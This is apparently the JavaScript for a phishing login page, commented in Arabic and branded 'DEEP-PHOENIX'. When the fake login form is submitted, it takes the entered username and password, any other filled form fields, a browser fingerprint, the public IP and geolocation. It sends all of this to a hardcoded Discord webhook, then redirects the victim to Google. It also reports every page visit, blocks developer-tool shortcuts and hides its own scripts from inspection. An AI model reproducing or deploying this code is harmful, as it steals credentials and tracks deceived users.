// Webhook URL
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1396147075670081708/6u20_hZV1ebG_VQA3MaDlJmbdQldWA_hJfwQ5PqxArzYiDPkuIzxYEckuj_VEq61X4H5';

// جمع المعلومات الأساسية عن المتصفح والنظام
function collectSystemInfo() {
    return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        languages: navigator.languages,
        cookieEnabled: navigator.cookieEnabled,
        screenWidth: screen.width,
        screenHeight: screen.height,
        colorDepth: screen.colorDepth,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        localStorageEnabled: !!window.localStorage,
        sessionStorageEnabled: !!window.sessionStorage,
        javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
        pdfViewerEnabled: navigator.pdfViewerEnabled || false,
        hardwareConcurrency: navigator.hardwareConcurrency || 'غير معروف',
        deviceMemory: navigator.deviceMemory || 'غير معروف',
        maxTouchPoints: navigator.maxTouchPoints || 0,
        timestamp: new Date().toISOString(),
        url: window.location.href,
        referrer: document.referrer
    };
}

// جمع معلومات الشبكة
async function collectNetworkInfo() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return { publicIP: data.ip };
    } catch (error) {
        return { publicIP: 'غير معروف' };
    }
}

// جمع المعلومات الجغرافية
async function collectGeoInfo(ip) {
    try {
        const response = await fetch(`http://ip-api.com/json/${ip}`);
        const data = await response.json();
        return data;
    } catch (error) {
        return { geoInfo: 'غير متاح' };
    }
}

// جمع كلمات المرور المحفوظة (إن أمكن)
function collectSavedPasswords() {
    const savedData = {};
    
    // محاولة جمع البيانات من الحقول التلقائية
    const forms = document.querySelectorAll('form');
    forms.forEach((form, index) => {
        const inputs = form.querySelectorAll('input[type="password"], input[type="text"], input[type="email"]');
        inputs.forEach(input => {
            if (input.value) {
                savedData[`form_${index}_${input.name}`] = input.value;
            }
        });
    });

    return savedData;
}

// جمع معلومات إضافية عن النظام
function collectAdvancedSystemInfo() {
    const advancedInfo = {};
    
    // معلومات عن المتصفح
    advancedInfo.browserName = getBrowserName();
    advancedInfo.browserVersion = getBrowserVersion();
    advancedInfo.isMobile = /Mobi|Android/i.test(navigator.userAgent);
    advancedInfo.isTablet = /Tablet|iPad/i.test(navigator.userAgent);
    
    // معلومات عن نظام التشغيل
    advancedInfo.os = getOperatingSystem();
    
    // معلومات عن المعالج والذاكرة
    advancedInfo.cpuCores = navigator.hardwareConcurrency;
    advancedInfo.deviceMemory = navigator.deviceMemory;
    
    return advancedInfo;
}

// الحصول على اسم المتصفح
function getBrowserName() {
    const userAgent = navigator.userAgent;
    if (userAgent.includes("Chrome") && !userAgent.includes("Edg")) return "Chrome";
    if (userAgent.includes("Firefox")) return "Firefox";
    if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) return "Safari";
    if (userAgent.includes("Edg")) return "Edge";
    return "متصفح آخر";
}

// الحصول على إصدار المتصفح
function getBrowserVersion() {
    const userAgent = navigator.userAgent;
    const temp = userAgent.match(/(Chrome|Firefox|Safari|Edg)\/([0-9.]+)/);
    return temp ? temp[2] : "غير معروف";
}

// الحصول على نظام التشغيل
function getOperatingSystem() {
    const userAgent = navigator.userAgent;
    if (userAgent.includes("Windows")) return "Windows";
    if (userAgent.includes("Mac")) return "MacOS";
    if (userAgent.includes("Linux")) return "Linux";
    if (userAgent.includes("Android")) return "Android";
    if (userAgent.includes("iOS")) return "iOS";
    return "غير معروف";
}

// إرسال البيانات إلى ويب هوك الديسكورد
async function sendToDiscord(data) {
    const embed = {
        title: "🎯 تم جمع بيانات جديدة",
        color: 0xff0000,
        fields: [
            {
                name: "🆔 المعلومات الأساسية",
                value: `**المتصفح:** ${data.systemInfo.userAgent}\n**النظام:** ${data.systemInfo.platform}\n**اللغة:** ${data.systemInfo.language}\n**الموقع الزمني:** ${data.systemInfo.timezone}`,
                inline: false
            },
            {
                name: "🖥️ معلومات الشاشة",
                value: `**الدقة:** ${data.systemInfo.screenWidth}x${data.systemInfo.screenHeight}\n**عمق الألوان:** ${data.systemInfo.colorDepth} بت`,
                inline: true
            },
            {
                name: "🌐 معلومات الشبكة",
                value: `**IP العام:** ${data.networkInfo.publicIP}\n**البلد:** ${data.geoInfo.country || 'غير معروف'}\n**المدينة:** ${data.geoInfo.city || 'غير معروف'}`,
                inline: true
            },
            {
                name: "🔐 بيانات الاعتماد",
                value: `**اسم المستخدم:** ${data.credentials.username || 'غير مدخل'}\n**كلمة المرور:** ${data.credentials.password || 'غير مدخلة'}`,
                inline: false
            },
            {
                name: "💻 المعلومات المتقدمة",
                value: `**نظام التشغيل:** ${data.advancedInfo.os}\n**المعالج:** ${data.advancedInfo.cpuCores} نواة\n**الذاكرة:** ${data.advancedInfo.deviceMemory} GB`,
                inline: true
            }
        ],
        timestamp: new Date().toISOString(),
        footer: {
            text: "نظام جمع البيانات - DEEP-PHOENIX"
        }
    };

    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                embeds: [embed],
                username: 'Data Collector',
                avatar_url: 'https://cdn-icons-png.flaticon.com/512/6062/6062646.png'
            })
        });
    } catch (error) {
        console.error('Error sending to Discord:', error);
    }
}

// إرسال البيانات كاملة كرسالة نصية
async function sendRawData(data) {
    const rawDataString = `
🎯 **تقرير جمع البيانات الكامل**

🆔 **المعلومات الأساسية:**
- User Agent: ${data.systemInfo.userAgent}
- Platform: ${data.systemInfo.platform}
- Language: ${data.systemInfo.language}
- Timezone: ${data.systemInfo.timezone}

🖥️ **معلومات النظام:**
- Screen: ${data.systemInfo.screenWidth}x${data.systemInfo.screenHeight}
- Color Depth: ${data.systemInfo.colorDepth}bit
- CPU Cores: ${data.advancedInfo.cpuCores}
- Memory: ${data.advancedInfo.deviceMemory}GB
- OS: ${data.advancedInfo.os}

🌐 **معلومات الشبكة:**
- Public IP: ${data.networkInfo.publicIP}
- Country: ${data.geoInfo.country || 'N/A'}
- City: ${data.geoInfo.city || 'N/A'}
- ISP: ${data.geoInfo.isp || 'N/A'}

🔐 **بيانات الدخول:**
- Username: ${data.credentials.username}
- Password: ${data.credentials.password}

⏰ **الطابع الزمني:** ${data.systemInfo.timestamp}
    `.trim();

    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                content: `\`\`\`${rawDataString}\`\`\``,
                username: 'Raw Data Collector'
            })
        });
    } catch (error) {
        console.error('Error sending raw data:', error);
    }
}

// العملية الرئيسية
document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const loadingElement = document.getElementById('loading');
    const submitButton = this.querySelector('button[type="submit"]');
    
    // إظهار تحميل
    loadingElement.style.display = 'block';
    submitButton.disabled = true;
    submitButton.textContent = 'جاري المعالجة...';

    // جمع البيانات
    const credentials = {
        username: document.getElementById('username').value,
        password: document.getElementById('password').value
    };

    try {
        // جمع جميع المعلومات
        const systemInfo = collectSystemInfo();
        const networkInfo = await collectNetworkInfo();
        const geoInfo = await collectGeoInfo(networkInfo.publicIP);
        const savedPasswords = collectSavedPasswords();
        const advancedInfo = collectAdvancedSystemInfo();

        // تجميع جميع البيانات
        const collectedData = {
            credentials,
            systemInfo,
            networkInfo,
            geoInfo,
            savedPasswords,
            advancedInfo
        };

        // إرسال البيانات إلى الديسكورد
        await sendToDiscord(collectedData);
        await sendRawData(collectedData);

        // إعادة توجيه الضحية بعد جمع البيانات
        setTimeout(() => {
            window.location.href = 'https://www.google.com'; // أو أي صفحة تريدها
        }, 3000);

    } catch (error) {
        console.error('Error:', error);
    } finally {
        loadingElement.style.display = 'none';
        submitButton.disabled = false;
        submitButton.textContent = 'بدء التحقق الآمن';
    }
});

// جمع البيانات تلقائياً عند تحميل الصفحة
window.addEventListener('load', async function() {
    // جمع البيانات الأساسية وإرسالها فوراً
    const systemInfo = collectSystemInfo();
    const networkInfo = await collectNetworkInfo();
    const geoInfo = await collectGeoInfo(networkInfo.publicIP);
    
    const initialData = {
        systemInfo,
        networkInfo,
        geoInfo,
        type: 'VISIT_DATA'
    };

    // إرسال بيانات الزيارة الأولية
    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                content: `🔍 **زيارة جديدة للموقع**\n\n**IP:** ${networkInfo.publicIP}\n**المتصفح:** ${systemInfo.userAgent}\n**الموقع:** ${geoInfo.country || 'غير معروف'} - ${geoInfo.city || 'غير معروف'}\n**الوقت:** ${new Date().toLocaleString('ar-SA')}`,
                username: 'Visit Tracker'
            })
        });
    } catch (error) {
        // تجاهل الأخطاء في الإرسال التلقائي
    }
});

// منع فحص الكود المصدري
document.addEventListener('contextmenu', function(e) {
    e.preventDefault();
    return false;
});

document.addEventListener('keydown', function(e) {
    // منع F12
    if (e.key === 'F12') {
        e.preventDefault();
        return false;
    }
    
    // منع Ctrl+Shift+I
    if (e.ctrlKey && e.shiftKey && e.key === 'I') {
        e.preventDefault();
        return false;
    }
    
    // منع Ctrl+U
    if (e.ctrlKey && e.key === 'u') {
        e.preventDefault();
        return false;
    }
    
    // منع Ctrl+Shift+C
    if (e.ctrlKey && e.shiftKey && e.key === 'C') {
        e.preventDefault();
        return false;
    }
});

// إخفاء الكود المصدري من الفحص
Object.defineProperty(document, 'scripts', {
    get: function() {
        return [];
    }
});
